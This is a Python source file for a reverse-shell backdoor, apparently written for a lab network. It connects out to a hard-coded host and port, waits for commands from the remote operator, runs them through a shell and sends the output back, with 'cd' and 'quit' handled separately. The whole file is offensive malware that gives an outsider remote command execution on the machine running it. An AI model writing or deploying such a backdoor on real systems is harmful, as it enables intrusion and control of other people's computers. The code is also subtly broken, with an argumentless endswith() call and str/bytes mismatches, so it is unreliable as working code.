import socket
import subprocess
import json
import os

class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

	def json_send(self, data):
		json_data = json.dumps(data)
		self.my_connection.send(json_data)

	def json_receive(self):
		json_data = ""
		while True:
			try:
				chunk = self.my_connection.recv(1024)
				if isinstance(chunk, bytes):
					chunk = chunk.decode('utf-8')
				json_data += chunk
				if json_data.endswith():
					return json.loads(json_data.strip())
			except ValueError:
				continue

	def execute_cd_command(self,directory):
		try:
			os.chdir(directory)
			return "Cd to " + directory
		except OSError as e:
			return "Error: " + str(e)

	def command_execution(self, command):
		try:
			return subprocess.check_output(command, shell=True)
		except subprocess.CalledProcessError as e:
			return "Error" + str(e)

	def start_socket(self):
		while True:
			command = self.json_receive()
			if command[0] == "quit":
				self.my_connection.close()
				exit()
			elif command[0] == "cd" and len(command) > 1:
				command_output = self.execute_cd_command(command[1])
			else:
				command_output = self.command_execution(command)
			self.json_send(command_output)

		self.my_connection.close()

my_socket_object = MySocket("10.0.2.16",8080)
my_socket_object.start_socket()

